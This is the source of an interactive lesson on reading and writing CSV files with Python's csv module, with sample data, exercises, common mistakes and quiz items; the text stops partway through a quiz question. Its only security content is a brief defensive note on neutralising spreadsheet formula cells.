// Python source as written: backslashes stay literal (\n stays \n). Only \` and \${ are unescaped.
const py = (s, ...v) => String.raw(s, ...v).replace(/\\([`$])/g, '$1')

const EXPENSES = py`# Expense summary: read a CSV, total by category, write a new CSV
import csv
from decimal import Decimal

totals = {}
biggest = None

with open("expenses.csv", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)               # the header row becomes the keys
    for row in reader:
        amount = Decimal(row["amount"])      # CSV only stores text: convert it
        category = row["category"]
        totals[category] = totals.get(category, Decimal("0")) + amount
        if biggest is None or amount > Decimal(biggest["amount"]):
            biggest = row

print("Columns:", reader.fieldnames)
for category, total in sorted(totals.items()):
    print(f"{category:<10} {total:>7}")
print("Biggest:", biggest["description"], "-", biggest["amount"])

with open("summary.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["category", "total"])
    for category, total in sorted(totals.items()):
        writer.writerow([category, total])

with open("summary.csv", encoding="utf-8") as f:
    print(f.read(), end="")
`

const EXPENSES_CSV = py`date,category,description,amount
2026-10-01,food,"Pizza, drinks",12.50
2026-10-02,transport,Bus pass,20.00
2026-10-03,food,Lunch,6.75
2026-10-05,fun,"Cinema ""Dune"" ticket",9.00
2026-10-06,food,Groceries,23.40
2026-10-08,fun,Bowling,15.00
`

const GRADES_CSV = py`name,subject,score
Ada,maths,91
Ben,maths,78
Cy,history,85
Ada,history,85
Ben,physics,64
Cy,maths,91
`

const SALES_CSV = py`region,product,units
north,pens,120
south,pens,80
north,paper,40
east,pens,15
south,paper,95
`

export default {
  id: 'csv-data',
  title: 'CSV files',
  summary: 'The csv module reads and writes spreadsheet-style tables correctly — quoted commas, embedded quotes and line breaks included — as lists or dicts of strings that you convert to real types yourself.',
  difficulty: 'intermediate',
  minutes: 40,
  prerequisites: ['reading-writing-files', 'dictionaries'],
  related: ['json-data', 'pathlib', 'serialization', 'type-conversion', 'collections-module', 'string-methods', 'numbers-and-math', 'dates-and-times', 'sql-and-sqlite', 'project-expense-tracker'],
  tags: ['csv', 'comma-separated values', 'spreadsheet', 'Excel', 'reader', 'writer', 'DictReader', 'DictWriter', 'newline', 'quoting', 'delimiter', 'tsv', 'utf-8-sig', 'BOM', 'Decimal', 'totals', 'group by', 'pandas', 'CSV injection'],
  apis: [
    { name: 'csv.reader(f, delimiter=",")', summary: 'Iterates over a file, yielding each row as a list of strings.' },
    { name: 'csv.writer(f)', summary: 'Returns a writer with writerow(list) and writerows(list_of_lists); handles quoting.' },
    { name: 'csv.DictReader(f)', summary: 'Like reader, but yields dicts keyed by the header row (reader.fieldnames).' },
    { name: 'csv.DictWriter(f, fieldnames=[...])', summary: 'Writes dicts as rows in fieldnames order; writeheader() writes the header row.' },
    { name: 'newline=""', summary: 'Always pass it to open() for CSV files, reading and writing: the csv module handles line endings itself.' },
    { name: 'quoting=csv.QUOTE_MINIMAL / QUOTE_ALL / QUOTE_NONNUMERIC', summary: 'Controls which fields the writer wraps in quotes (minimal is the default).' },
    { name: 'reader.line_num', summary: 'How many physical lines the reader has consumed — useful in error messages.' },
    { name: 'encoding="utf-8-sig"', summary: 'Reads UTF-8 with or without the byte-order mark Excel adds; writes one for Excel.' },
  ],
  docs: [
    { label: 'csv — CSV file reading and writing', url: 'https://docs.python.org/3/library/csv.html' },
    { label: 'csv — module contents and quoting constants', url: 'https://docs.python.org/3/library/csv.html#module-contents' },
    { label: 'RFC 4180 — common format for CSV files', url: 'https://www.rfc-editor.org/rfc/rfc4180' },
    { label: 'decimal — exact decimal arithmetic', url: 'https://docs.python.org/3/library/decimal.html' },
  ],

  // ------------------------------------------------------------------ learn
  intro: [
    py`A **CSV** file (*comma-separated values*) is a table stored as plain text: one line per row, commas between the cells, and usually a **header** row naming the columns. Every spreadsheet program can open and save it, which makes CSV the most common way to move tables between people and programs.`,
    { code: py`date,category,description,amount
2026-10-01,food,"Pizza, drinks",12.50
2026-10-05,fun,"Cinema ""Dune"" ticket",9.00`, lang: 'text', title: 'expenses.csv' },
    py`Look closely at the last two lines. A cell that **contains a comma** is wrapped in double quotes, and a **double quote inside a cell** is written twice (\`""\`). Those rules are why you shouldn't take CSV apart with \`line.split(",")\` — Python's built-in **csv** module knows them all.`,
    { code: py`import csv

with open("expenses.csv", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f):
        print(row["description"], row["amount"])   # Pizza, drinks 12.50 ...`, lang: 'python', title: 'the core pattern', static: true },
    py`This lesson uses [files](lesson:reading-writing-files) and [dictionaries](lesson:dictionaries). Compare CSV with [JSON](lesson:json-data), and see [serialization](lesson:serialization) for choosing between formats.`,
  ],
  why: [
    py`Spreadsheets are everywhere: school marks, bank statements, sales reports, sensor logs, exported contact lists. "Download as CSV" is how that data reaches your program, and "save as CSV" is how your results get back into someone's spreadsheet.`,
    py`CSV looks too simple to need a library — until a customer's address contains a comma, a product name contains a quote, or a note spans two lines. Hand-written parsing silently shifts columns and corrupts data. The csv module handles every one of those cases, on reading *and* writing.`,
    py`CSV also teaches an important habit: **text formats don't remember types**. A CSV "number" is just characters; you decide whether it becomes an \`int\`, a \`Decimal\` or a \`date\`, and what to do when it's missing or malformed.`,
  ],
  eli15: [
    py`Imagine a teacher's mark sheet typed into a text message: each student on a new line, and commas between name, subject and mark. Easy — until a student is called *"Smith, Jr."*. Now the comma in the name looks like a column break!`,
    py`So CSV has a rule: if a cell has a comma in it, put the whole cell in quotes: \`"Smith, Jr."\`. And if the cell has quotes in it, double them. The csv module is the friend who knows these rules by heart, so you never have to think about them. And remember: CSV stores **only text** — the mark \`91\` arrives as the string \`"91"\`, and you turn it into a number yourself.`,
  ],
  analogy: {
    title: 'Ice-cube trays and labelled bags',
    body: [
      py`A CSV file is like an ice-cube tray: a grid of identical little compartments, row after row. Cheap, simple, every kitchen (spreadsheet) has one. But each compartment holds only one thing — frozen *text* — and the tray doesn't tell you whether a cube was juice or water: you have to know, or check the label on the column.`,
      py`If one cube is too big and spills over the edge (a comma inside a cell), it messes up its neighbours — unless you wrap it in cling film (quotes). The csv module wraps and unwraps those cubes for you.`,
    ],
    mapping: [
      ['the tray', 'the CSV file'],
      ['one row of compartments', 'one line / one row'],
      ['the labels along the top', 'the header row (DictReader keys)'],
      ['each frozen cube', 'one field — always a string'],
      ['cling film around an oversized cube', 'quotes around a field containing a comma, quote or newline'],
      ['deciding what each cube really is', 'converting fields with int(), Decimal(), date.fromisoformat()'],
    ],
  },
  visual: {
    type: 'code-tracer',
    title: 'Write tricky cells, look at the raw text, read them back',
    props: {
      code: py`import csv

with open("pets.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["name", "species", "note"])
    writer.writerow(["Rex", "dog", "loves balls, sticks"])
    writer.writerow(["Tom", "cat", 'says "meow"'])

with open("pets.csv", newline="", encoding="utf-8") as f:
    raw = f.read()
print(repr(raw))

with open("pets.csv", newline="", encoding="utf-8") as f:
    for row in csv.reader(f):
        print(len(row), row)
`,
      notes: {
        3: '`newline=""` — the csv module writes its own line endings, so the file layer must not translate them.',
        6: 'This cell contains a comma. The writer will wrap it in quotes so it stays **one** field.',
        7: 'This cell contains double quotes. The writer will wrap it in quotes **and** double the inner quotes.',
        11: 'The raw text: quoted fields, `""` for a literal quote, and `\\r\\n` at the end of each row (the CSV standard line ending).',
        15: 'Every row comes back as a list of exactly 3 strings — the quoting rules are undone automatically.',
      },
    },
    alt: 'A step-by-step trace. A csv.writer writes a header and two rows, one containing a comma and one containing double quotes. Reading the raw file shows the field "loves balls, sticks" wrapped in quotes and the field "says ""meow""" with doubled quotes, with \\r\\n line endings. Reading it back with csv.reader gives three rows of exactly three strings each.',
    caption: py`The raw text is what Excel or another program sees; the lists are what your code sees. The csv module translates in both directions so that a comma or a quote inside a cell never breaks the columns.`,
  },
  syntax: [
    py`#### Reading rows as lists`,
    { code: py`import csv

with open("expenses.csv", newline="", encoding="utf-8") as f:
    reader = csv.reader(f)
    header = next(reader)          # the first row: ['date', 'category', 'description', 'amount']
    for row in reader:             # every later row is a list of str
        date, category, description, amount = row
        print(category, amount)`, lang: 'python', title: 'csv.reader', static: true },
    py`#### Reading rows as dicts (usually nicer)`,
    { code: py`import csv

with open("expenses.csv", newline="", encoding="utf-8") as f:
    reader = csv.DictReader(f)         # uses the header row for the keys
    print(reader.fieldnames)           # ['date', 'category', 'description', 'amount']
    for row in reader:
        print(row["category"], row["amount"])   # still strings!`, lang: 'python', title: 'csv.DictReader', static: true },
    py`\`DictReader\` makes code readable (\`row["amount"]\` instead of \`row[3]\`) and keeps working if someone reorders the columns. If a row has **more** cells than the header, the extras go in a list under the key \`None\`; if it has **fewer**, the missing keys get \`None\` (change that with \`restval=\`). Pass \`fieldnames=[...]\` yourself when a file has no header row.`,
    py`#### Writing`,
    { code: py`import csv

rows = [["Ada", "maths", 91], ["Ben", "art, design", 78]]

with open("marks.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.writer(f)
    writer.writerow(["name", "subject", "score"])   # one row
    writer.writerows(rows)                          # many rows
# marks.csv:
# name,subject,score
# Ada,maths,91
# Ben,"art, design",78`, lang: 'python', title: 'csv.writer' },
    { code: py`import csv

students = [{"name": "Ada", "score": 91, "house": "red"}, {"name": "Ben", "score": 78}]

with open("marks.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=["name", "score", "house"], restval="")
    writer.writeheader()
    writer.writerows(students)       # Ben's missing "house" is written as ""`, lang: 'python', title: 'csv.DictWriter' },
    py`Values that aren't strings are converted with \`str()\` (and \`None\` becomes an empty cell). A dict key that isn't in \`fieldnames\` raises \`ValueError: dict contains fields not in fieldnames: 'phone'\` — pass \`extrasaction="ignore"\` to drop extras on purpose.`,
    py`#### Always open CSV files with newline=""`,
    py`The csv module reads and writes line endings itself (it writes \`\r\n\`, as the CSV standard says). If the file layer also translates them, two things break: on **Windows**, every \`\r\n\` the writer produces becomes \`\r\r\n\`, which shows up as **blank lines between rows** in Excel; and when **reading**, a quoted field that contains a line break can be split incorrectly. \`newline=""\` turns the file layer's translation off. The Python docs say to use it for every CSV file, in both directions.`,
    py`#### Quoting and dialects`,
    py`| option | meaning |
|---|---|
| \`delimiter=";"\` | cells separated by \`;\` (common in countries that write decimals as \`3,5\`); \`"\t"\` for TSV |
| \`quoting=csv.QUOTE_MINIMAL\` | default: quote only fields that need it (comma, quote, newline) |
| \`quoting=csv.QUOTE_ALL\` | quote every field |
| \`quoting=csv.QUOTE_NONNUMERIC\` | writer quotes all non-numbers; reader turns unquoted fields into \`float\` |
| \`quotechar='"'\`, \`doublequote=True\` | the quote character, and doubling it inside fields (both defaults) |`,
    py`A preset bundle of these options is called a **dialect**: \`"excel"\` (the default), \`"excel-tab"\` and \`"unix"\`. Python **3.12** added \`QUOTE_STRINGS\` and \`QUOTE_NOTNULL\` for finer control over how \`None\` and empty strings are written.`,
    py`#### Converting types`,
    { code: py`from datetime import date
from decimal import Decimal

row = {"date": "2026-10-01", "qty": "3", "price": "12.50", "note": ""}
when = date.fromisoformat(row["date"])     # datetime.date(2026, 10, 1)
qty = int(row["qty"])                      # 3
price = Decimal(row["price"])              # Decimal('12.50') — exact, good for money
note = row["note"] or None                 # treat "" as "missing"
print(when, qty * price, note)             # 2026-10-01 37.50 None`, lang: 'python', title: 'every field arrives as str' },
    py`Use \`int\` for counts, \`Decimal\` for money (floats can't store 0.1 exactly — see [numbers](lesson:numbers-and-math)), \`date.fromisoformat\` for ISO dates (see [dates & times](lesson:dates-and-times)), and decide explicitly what an empty cell means.`,
  ],
  walkthrough: {
    title: 'Reading the expense summary',
    lang: 'python',
    code: EXPENSES,
    intro: py`This is the playground program below; \`expenses.csv\` is in the second tab. Press **Guide** in the playground to step through it there.`,
    steps: [
      { lines: [8, 9], text: py`The file is opened with \`newline=""\` (the csv rule) and \`encoding="utf-8"\`. \`DictReader\` reads the first line as the header and will use \`date\`, \`category\`, \`description\`, \`amount\` as keys.` },
      { lines: [10, 11], text: py`Each \`row\` is a dict of **strings**. \`Decimal(row["amount"])\` converts \`"12.50"\` into an exact decimal number — floats would accumulate tiny rounding errors in money totals.` },
      { lines: [12, 13], text: py`Totals per category, the "group by" pattern: \`totals.get(category, Decimal("0"))\` starts each new category at zero.` },
      { lines: [14, 15], text: py`Keep the whole row with the largest amount. Comparing needs numbers, so the stored row's amount is converted again — comparing the strings \`"9.00" > "23.40"\` would be \`True\`, because strings compare character by character!` },
      { lines: [17, 20], text: py`\`reader.fieldnames\` holds the header. Notice the biggest description and the quoted descriptions print without their CSV quotes — the reader removed them.` },
      { lines: [22, 26], text: py`\`csv.writer\` writes lists as rows. Decimals are converted with \`str()\`, so \`42.65\` is written exactly. Again \`newline=""\`.` },
      { lines: [28, 29], text: py`Reading the result back as plain text shows the CSV the next program — or a spreadsheet — will see.` },
    ],
  },
  playground: {
    title: 'Expense summary',
    objective: 'Read a CSV with tricky quoted cells, total the amounts per category, and write the summary as a new CSV.',
    files: { 'main.py': EXPENSES, 'expenses.csv': EXPENSES_CSV },
    expected: py`\`\`\`text
Columns: ['date', 'category', 'description', 'amount']
food         42.65
fun          24.00
transport    20.00
Biggest: Groceries - 23.40
category,total
food,42.65
fun,24.00
transport,20.00
\`\`\`

\`expenses.csv\` is rewritten from its tab before every run and \`summary.csv\` disappears between runs (the playground's file system lives in memory).`,
    experiments: [
      {
        id: 'new-expense',
        task: py`Add a row to **expenses.csv** for an arcade trip on 2026-10-09 in the \`fun\` category, with the description \`Arcade, snacks\` (it contains a comma!) and the amount \`7.25\`.`,
        hint: py`Quote the description: \`2026-10-09,fun,"Arcade, snacks",7.25\`. Without the quotes the row would have five cells.`,
        tests: [{ name: 'fun now totals 31.25', code: py`from decimal import Decimal
assert totals.get("fun") == Decimal("31.25"), "Add 2026-10-09,fun,\"Arcade, snacks\",7.25 to expenses.csv"` }],
        explain: py`The quotes keep \`Arcade, snacks\` in one cell. Try the row without quotes: \`DictReader\` sees five cells for four headers, puts the extra one under the key \`None\`, and \`row["amount"]\` becomes \`" snacks"\` — which \`Decimal\` rejects. That's exactly the bug \`split(",")\` would cause on every quoted row.`,
      },
      {
        id: 'counts',
        task: py`Also count **how many** expenses each category has: build a dict \`counts\` such as \`{"food": 3, ...}\` inside the same loop, and print it.`,
        hint: py`Create \`counts = {}\` next to \`totals\`, and in the loop: \`counts[category] = counts.get(category, 0) + 1\`. (\`collections.Counter\` works too.)`,
        tests: [{ name: 'counts per category', code: py`assert dict(ns.get("counts") or {}) == {"food": 3, "transport": 1, "fun": 2}` }],
        explain: py`Counting and summing in one pass is the core of every "summarise a CSV" task. With \`counts\` and \`totals\` you could also compute averages per category — a spreadsheet pivot table in a few lines.`,
      },
      {
        id: 'semicolons',
        task: py`A colleague in Germany wants the summary with **semicolons** between the cells (their spreadsheet uses commas for decimals). Change only the writer so \`summary.csv\` uses \`;\`.`,
        hint: py`\`csv.writer(f, delimiter=";")\``,
        tests: [{ name: 'summary.csv uses semicolons', code: py`with open("summary.csv", encoding="utf-8") as f:
    first = f.readline().strip()
assert first == "category;total", f"First line is {first!r}"` }],
        explain: py`The delimiter is part of the CSV *dialect*. Readers must use the same one: \`csv.reader(f, delimiter=";")\`. Tab-separated files (TSV) are the same idea with \`delimiter="\t"\`.`,
      },
      {
        id: 'bad-row',
        task: py`Real exports are messy. Add the row \`2026-10-10,food,Mystery snack,\` (no amount) to **expenses.csv** and run — it crashes. Make the loop print \`Skipping line N: no valid amount\` (use \`reader.line_num\`) and carry on.`,
        hint: py`\`Decimal("")\` raises \`decimal.InvalidOperation\`. Wrap the conversion in \`try\` / \`except InvalidOperation:\` (import it from \`decimal\`), print the message and \`continue\`.`,
        tests: [
          { name: 'a warning names the bad line', code: py`assert "Skipping line" in output, "Add the row without an amount, then print 'Skipping line N: ...'"` },
          { name: 'the good rows are still totalled', code: py`from decimal import Decimal
assert totals.get("food") == Decimal("42.65")` },
        ],
        explain: py`\`reader.line_num\` counts physical lines read so far, so the message points straight at the problem in the file (the header is line 1, so the first data row is line 2). Skipping-and-reporting is one policy; for financial data you might prefer to stop and refuse the whole file — decide deliberately.`,
      },
    ],
  },
  animation: {
    type: 'comparison',
    title: 'Why not just split on commas?',
    props: {
      left: {
        label: 'line.split(",") — breaks on real data',
        lang: 'python',
        code: py`line = '2026-10-01,food,"Pizza, drinks",12.50'
print(line.split(","))
# ['2026-10-01', 'food', '"Pizza', ' drinks"', '12.50']
# 5 pieces, quotes left in, amount in the wrong place`,
      },
      right: {
        label: 'csv.reader — follows the CSV rules',
        lang: 'python',
        code: py`import csv

line = '2026-10-01,food,"Pizza, drinks",12.50'
print(next(csv.reader([line])))
# ['2026-10-01', 'food', 'Pizza, drinks', '12.50']
# 4 fields, quotes removed`,
      },
      points: [
        'A comma inside quotes is data, not a separator — split() can\'t tell the difference.',
        'Doubled quotes ("") inside a field mean one literal quote; the reader undoes that, split() leaves them.',
        'A quoted field may even contain a line break, so one row can span two lines of the file; looping over lines and splitting can never handle that.',
        'The same applies to writing: csv.writer adds quotes exactly when needed, while ",".join(cells) silently produces broken rows.',
      ],
    },
    alt: 'Side-by-side comparison. Left: splitting the line 2026-10-01,food,"Pizza, drinks",12.50 on commas gives five pieces with stray quote characters. Right: csv.reader gives the four correct fields with Pizza, drinks as a single field.',
  },

  // ------------------------------------------------------------- understand
  internals: {
    beginner: [
      py`The reader is a small **state machine**: it walks through the text one character at a time, remembering whether it is *inside quotes* or not. Outside quotes, a comma ends a field and a line break ends a row; inside quotes they're just characters. A doubled quote inside quotes means one literal quote.`,
      py`Because it works on a stream of characters, \`csv.reader\` accepts **any iterable of strings** — an open file, a list of lines, \`io.StringIO\` text — and reads **lazily**, row by row. A 10 GB CSV can be processed with almost no memory as long as you don't collect all the rows in a list.`,
    ],
    technical: [
      py`CSV is less a standard than a family of habits. RFC 4180 describes the common form (commas, \`"\` quoting, \`\r\n\` line endings), but real files use semicolons, tabs, other quote styles and other encodings. The csv module's **dialects** and **format parameters** (\`delimiter\`, \`quotechar\`, \`escapechar\`, \`doublequote\`, \`skipinitialspace\`, \`lineterminator\`, \`quoting\`, \`strict\`) cover these. \`csv.Sniffer().sniff(sample)\` can guess a dialect from a sample, but a guess is a guess — prefer knowing the format.`,
      py`**Encodings and the BOM.** Excel's "CSV UTF-8" option begins the file with a **byte-order mark** (BOM), the invisible character U+FEFF. Read with \`encoding="utf-8"\`, it sticks to the first header: \`reader.fieldnames\` is \`['\ufeffdate', 'amount']\` and \`row["date"]\` raises \`KeyError: 'date'\`. \`encoding="utf-8-sig"\` strips a BOM if present and is harmless otherwise; writing with \`"utf-8-sig"\` adds one, which helps Excel recognise UTF-8.`,
      { code: py`import csv

with open("bom.csv", "w", encoding="utf-8-sig", newline="") as f:
    f.write("date,amount\r\n2026-10-01,5\r\n")

with open("bom.csv", encoding="utf-8", newline="") as f:
    print(csv.DictReader(f).fieldnames)      # ['\ufeffdate', 'amount']
with open("bom.csv", encoding="utf-8-sig", newline="") as f:
    print(csv.DictReader(f).fieldnames)      # ['date', 'amount']`, lang: 'python', title: 'the invisible BOM' },
      { callout: 'note', title: 'CPython detail', text: py`In CPython the parser and writer are implemented in C (the \`_csv\` extension module), which is why the csv module is fast despite reading character by character. The module's behaviour is specified by its documentation, so other implementations behave the same; only speed differs.` },
    ],
    production: [
      py`**Validate as you convert.** Treat a CSV like any external input: check the header is what you expect (\`reader.fieldnames\`), convert every field explicitly, and report problems with \`reader.line_num\`. Decide a policy per job — skip-and-log bad rows, or reject the whole file — and test it.`,
      py`**Money and IDs.** Use \`Decimal\` for amounts. Keep identifiers like phone numbers, postcodes and account numbers as **strings**: converting \`"007"\` to \`int\` drops the leading zeros forever. Spreadsheets do this to CSVs too, which is a common source of corrupted exports.`,
      py`**CSV injection.** If you export data that users typed (names, comments) and someone opens the file in a spreadsheet, a cell starting with \`=\`, \`+\`, \`-\` or \`@\` may be run as a **formula**. OWASP recommends neutralising such cells, e.g. prefixing them with a single quote, when the file is meant for spreadsheet users. See [input validation](lesson:input-validation).`,
      py`**When to reach for pandas.** For analysis — grouping, joining, pivoting large tables — the third-party **pandas** library reads CSVs into DataFrames with type inference built in. It isn't available in this sandbox, so here it is as static code:`,
      { code: py`import pandas as pd   # third-party: pip install pandas

df = pd.read_csv("expenses.csv", parse_dates=["date"])
print(df.groupby("category")["amount"].sum())`, lang: 'python', title: 'the same summary with pandas (not runnable here)', static: true },
      py`pandas loads the whole file into memory and guesses types (it would read \`12.50\` as a float, not a Decimal). The csv module streams and guesses nothing. For data that outgrows both, load it into a database such as [SQLite](lesson:sql-and-sqlite) and query it with SQL.`,
    ],
  },
  mistakes: [
    {
      title: 'Splitting lines on commas yourself',
      wrong: { code: py`with open("expenses.csv", encoding="utf-8") as f:
    for line in f:
        date, category, description, amount = line.strip().split(",")
        # ValueError: too many values to unpack — on "Pizza, drinks"`, lang: 'python', static: true },
      right: { code: py`import csv

with open("expenses.csv", newline="", encoding="utf-8") as f:
    for date, category, description, amount in csv.reader(f):
        ...`, lang: 'python', static: true },
      explanation: py`Quoted commas, doubled quotes and multi-line cells all break \`split\`. Worse, sometimes it doesn't crash and just shifts the columns. Let the csv module parse.`,
    },
    {
      title: 'Forgetting newline=""',
      wrong: { code: py`import csv

with open("out.csv", "w", encoding="utf-8") as f:          # no newline=""
    csv.writer(f).writerows([["a", 1], ["b", 2]])
# On Windows: a blank line between every row in Excel`, lang: 'python' },
      right: { code: py`import csv

with open("out.csv", "w", newline="", encoding="utf-8") as f:
    csv.writer(f).writerows([["a", 1], ["b", 2]])`, lang: 'python' },
      explanation: py`The writer ends rows with \`\r\n\`; text mode on Windows turns the \`\n\` into \`\r\n\` again, giving \`\r\r\n\`. On Linux and macOS you won't notice — until a Windows user does. Use \`newline=""\` for reading too.`,
    },
    {
      title: 'Doing maths on the strings',
      wrong: { code: py`row = {"name": "Ada", "score": "91"}
print(row["score"] * 2)          # 9191 — string repetition
print("9.00" > "23.40")          # True — compared character by character`, lang: 'python' },
      right: { code: py`from decimal import Decimal

row = {"name": "Ada", "score": "91"}
print(int(row["score"]) * 2)               # 182
print(Decimal("9.00") > Decimal("23.40"))  # False`, lang: 'python' },
      explanation: py`Every CSV field is a \`str\`. Arithmetic, comparisons, sorting and \`max()\` all behave differently on strings — usually without an error. Convert first.`,
    },
    {
      title: 'Building rows with ",".join()',
      wrong: { code: py`cells = ["Ben", "art, design", 78]
line = ",".join(str(c) for c in cells)     # Ben,art, design,78  — 4 columns now`, lang: 'python' },
      right: { code: py`import csv
import io

buffer = io.StringIO()
csv.writer(buffer).writerow(["Ben", "art, design", 78])
print(buffer.getvalue(), end="")           # Ben,"art, design",78`, lang: 'python' },
      explanation: py`Joining with commas doesn't quote anything, so any comma, quote or newline in your data corrupts the file. \`csv.writer\` quotes exactly when needed. (\`io.StringIO\` is an in-memory text file — handy for building CSV text without touching the disk.)`,
    },
    {
      title: 'Forgetting writeheader() with DictWriter',
      wrong: { code: py`import csv

with open("marks.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=["name", "score"])
    writer.writerow({"name": "Ada", "score": 91})   # no header row in the file`, lang: 'python' },
      right: { code: py`import csv

with open("marks.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, fieldnames=["name", "score"])
    writer.writeheader()
    writer.writerow({"name": "Ada", "score": 91})`, lang: 'python' },
      explanation: py`\`fieldnames\` only sets the column order; the header line is written by \`writeheader()\`. Without it, a later \`DictReader\` uses the first data row as the header.`,
    },
  ],
  debugging: [
    {
      symptom: py`KeyError: 'date' — but the file clearly has a "date" column`,
      cause: py`An invisible byte-order mark from Excel is glued to the first header (\`'\ufeffdate'\`), or the header has stray spaces (\`' date'\`).`,
      fix: py`Print \`reader.fieldnames\` with \`repr\`. Open with \`encoding="utf-8-sig"\`; for spaces, pass \`skipinitialspace=True\` or clean the names.`,
    },
    {
      symptom: py`TypeError: unsupported operand type(s) for +=: 'int' and 'str'`,
      cause: py`You added a CSV field (a string) to a number.`,
      fix: py`Convert the field: \`total += int(row["score"])\` (or \`Decimal(...)\`, \`float(...)\`).`,
    },
    {
      symptom: py`ValueError: invalid literal for int() with base 10: ''`,
      cause: py`An empty cell — missing data — reached \`int()\`. (\`Decimal("")\` raises \`decimal.InvalidOperation\` instead.)`,
      fix: py`Decide what "missing" means: skip the row, use a default, or report it with \`reader.line_num\`.`,
    },
    {
      symptom: py`ValueError: dict contains fields not in fieldnames: 'phone'`,
      cause: py`\`DictWriter.writerow\` received a key that isn't one of the columns.`,
      fix: py`Add the column to \`fieldnames\`, or pass \`extrasaction="ignore"\` if dropping extra keys is intended.`,
    },
    {
      symptom: py`Blank lines between rows when the CSV is opened in Excel`,
      cause: py`The file was written without \`newline=""\` on Windows, so each row ends with \`\r\r\n\`.`,
      fix: py`Open with \`open(path, "w", newline="", encoding="utf-8")\`.`,
    },
    {
      symptom: py`Every row comes back as a single long field`,
      cause: py`The file uses a different delimiter (\`;\` or a tab).`,
      fix: py`Open the file as text and look at a line, then pass \`delimiter=";"\` or \`delimiter="\t"\`.`,
    },
  ],
  bestPractices: [
    'Use the csv module for every CSV read and write — never split() or ",".join().',
    'Open CSV files with newline="" and an explicit encoding (utf-8, or utf-8-sig for files from Excel).',
    'Prefer DictReader/DictWriter so code refers to columns by name.',
    'Convert every field explicitly: int for counts, Decimal for money, date.fromisoformat for dates; keep IDs and phone numbers as strings.',
    'Check reader.fieldnames before processing, and report bad rows with reader.line_num.',
    'Stream rows; only collect what you need (totals, counts), not the whole file.',
    'When exporting user-entered text for spreadsheet users, neutralise cells that start with =, +, -, @.',
  ],
  useCases: [
    'Importing bank statements, marks, sales or sensor data exported from a spreadsheet or another system.',
    'Producing reports that non-programmers open in Excel, Numbers or Google Sheets.',
    'Summarising data: totals, counts and averages per category (a "pivot table" in code).',
    'Cleaning messy exports: fixing types, removing duplicates, normalising columns.',
    'Moving tabular data into a database (csv.reader feeding sqlite3 executemany).',
  ],
  comparison: {
    title: 'Three ways to read a CSV line',
    headers: ['', 'line.split(",")', 'csv.reader', 'csv.DictReader'],
    rows: [
      ['each row is', 'a list of str', 'a list of str', 'a dict of str, keyed by the header'],
      ['commas inside quotes', 'broken into pieces', 'kept in one field', 'kept in one field'],
      ['doubled quotes ""', 'left in the text', 'turned into "', 'turned into "'],
      ['a line break inside a field', 'splits the row', 'handled', 'handled'],
      ['header row', 'just another line', 'next(reader) to take it', 'used for the keys automatically'],
      ['access a column', 'parts[3]', 'row[3]', 'row["amount"]'],
      ['converts types', 'no', 'no', 'no — you always convert'],
    ],
    note: py`For writing, the same applies: \`csv.writer\` / \`csv.DictWriter\` quote exactly when needed. And none of the three converts types — CSV has none to convert.`,
  },

  // ------------------------------------------------------------------- quiz
  quiz: [
    {
      id: 'csv-data-q1',
      type: 'mcq',
      prompt: 'Why does the documentation tell you to open CSV files with `newline=""`?',
      options: [
        { text: 'It makes the file smaller', why: 'It changes how line endings are handled, not the size of the data.' },
        'The csv module handles line endings itself; without it you can get blank rows on Windows and mis-read line breaks inside quoted fields',
        { text: 'It removes the header row', why: 'newline has nothing to do with headers. DictReader uses the header; reader returns it as the first row.' },
        { text: 'It is only needed when reading, not writing', why: 'It matters in both directions — the blank-row problem is a writing problem.' },
      ],
      answer: 1,
      explanation: py`The writer ends rows with \`\r\n\`; text-mode translation on Windows would turn that into \`\r\r\n\`. When reading, the reader needs to see the raw line endings to handle quoted fields that contain newlines correctly.`,
    },
    {
      id: 'csv-data-q2',
      type: 'output',
      prompt: 'What do the two lines print?',
      code: py`import csv

line = 'Ada,"London, UK",42'
print(line.split(","))
print(next(csv.reader([line])))`,
      options: [
        { text: "['Ada', 'London, UK', '42'] twice", why: 'split() knows nothing about quotes, so it also splits at the comma inside "London, UK".' },
        "['Ada', '\"London', ' UK\"', '42'] then ['Ada', 'London, UK', '42']",
        { text: "['Ada', '\"London', ' UK\"', '42'] twice", why: 'csv.reader follows the quoting rules, so the quoted comma stays inside one field.' },
        { text: "['Ada', 'London, UK', 42] for the second line", why: 'The reader never converts types: 42 stays the string \'42\'.' },
      ],
      answer: 1,
      explanation: py`\`split\` cuts at every comma and keeps the quote characters. \`csv.reader\` treats the quoted comma as data, removes the quotes and returns three strings.`,
    },
    {
      id: 'csv-data-q3',
      type: 'output',
      prompt: 'Predict the output.',
      code: py`import csv
import io

data = io.StringIO("name,score\nAda,91\n")
row = next(csv.DictReader(data))
print(row["score"] * 2)`,
      answer: '9191',
      explanation: py`\`row["score"]\` is the **string** \`"91"\`, and multiplying a string by 2 repeats it. Convert with \`int(row["score"])\` to get \`182\`.`,
    },
    {
      id: 'csv-data-q4',
      type: 'bug',
      prompt: 'This crashes with `TypeError: unsupported operand type(s) for +=: \'int\' and \'str\'`. Click the line to fix.',
      code: py`import csv

total = 0
with open("scores.csv", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f):
        total += row["score"]
print(total)`,
      answerLine: 6,
      explanation: py`CSV fields are strings. \`total += int(row["score"])\` converts before adding.`,
    },
    {
      id: 'csv-data-q5',
      type: 'fill',
      prompt: 'Write a list of dicts to `contacts.csv`, with a header row, columns in the order name then email.',
      code: py`import csv

with open("contacts.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(f, ___=["name", "email"])
    writer.___()
    writer.writerows(contacts)`,
      answer: [['fieldnames'], ['writeheader']],
      explanation: py`\`fieldnames\` fixes the column order (and which keys are allowed); \`writeheader()\` writes the header line itself.`,
    },
    {
      id: 'csv-data-q6',
      type: 'mcq',
      prompt: 'A bank exports `date;amount;payee` with `;` between cells. How do you read it?',
      options: [
        { text: 'line.split(";") on each line', why: 'Same problem as split(","): a quoted payee containing ";" would break.' },
